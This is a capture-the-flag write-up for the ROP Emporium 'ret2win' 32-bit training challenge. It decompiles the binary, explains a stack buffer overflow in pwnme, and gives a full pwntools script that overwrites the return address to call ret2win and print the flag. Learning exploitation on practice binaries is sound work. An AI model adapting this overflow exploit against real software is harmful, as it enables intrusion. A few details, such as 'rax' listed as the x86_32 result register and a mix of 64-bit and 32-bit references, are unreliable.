# Ret2win (x86)

## x86_32 architecture
### Calling convention
#### Arguments
`stack`
#### Results
`rax`
### Frame structure
![framestructure](imgs/frame_x86.png)

Source: [here](https://tanana.io/how-2-haq/)

## Reversing with Ghidra
### Main
```c
int main() {
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```
### Pwnme
```c
void pwnme() {
  char buf[40];
  
  memset(buf, 0, 0x20);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don\'t worry about null bytes, we\'re using read()!\n");
  printf("> ");
  read(0, buf, 0x38);
  puts("Thank you!");
  return;
}
```
### ret2win (target)
```c
void ret2win() {
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

## The vuln
The `read` function reads `0x38` (`56`) bytes but the buffer is only `40` bytes long, this allows us to overflow the `buf` variable and write on the stack wherever we want (the `return address` in our case).

## The exploit
```py
from pwn import *

#
# Context
#

e = context.binary = ELF('ret2win32')

#
# ROP
#

target = p32(0x0804862c)

#
# Find Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x38))
io.wait()

core = io.corefile
offset = cyclic_find(bytes.fromhex(hex(core.eip)[2:])[::-1])

io.close()

info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += target

io = process(e.path)
io.sendlineafter(b'> ', payload)

info(io.recvall().decode())

io.close()
```